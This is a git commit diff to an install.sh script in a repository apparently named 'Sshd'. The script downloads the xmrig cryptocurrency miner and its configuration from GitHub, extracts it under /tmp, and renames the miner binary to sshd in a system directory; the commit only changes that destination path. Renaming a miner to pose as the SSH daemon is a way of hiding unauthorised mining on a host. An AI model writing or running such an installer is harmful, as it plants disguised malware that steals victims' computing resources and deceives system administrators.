545ac158412fce441f7e42699a678717b945126e
Hackme258 <146896274+Hackme258@users.noreply.github.com>
2023-11-30 01:51:26 +0100

    Update install.sh

--- install.sh
+++ install.sh
@@ -12,7 +12,7 @@ wget "https://github.com/Hackme258/Sshd/raw/main/xmrig.tgz"
 #decompresse
 mv xmrig.tgz /tmp/mx/xmrig.tgz
 tar -zxvf xmrig.tgz
-mv /tmp/mx/minerd /usr/sbin/sshd
+mv /tmp/mx/minerd /usr/bin/sshd
 
 #wget la config
 wget "https://github.com/Hackme258/Sshd/raw/main/xmrig.json"
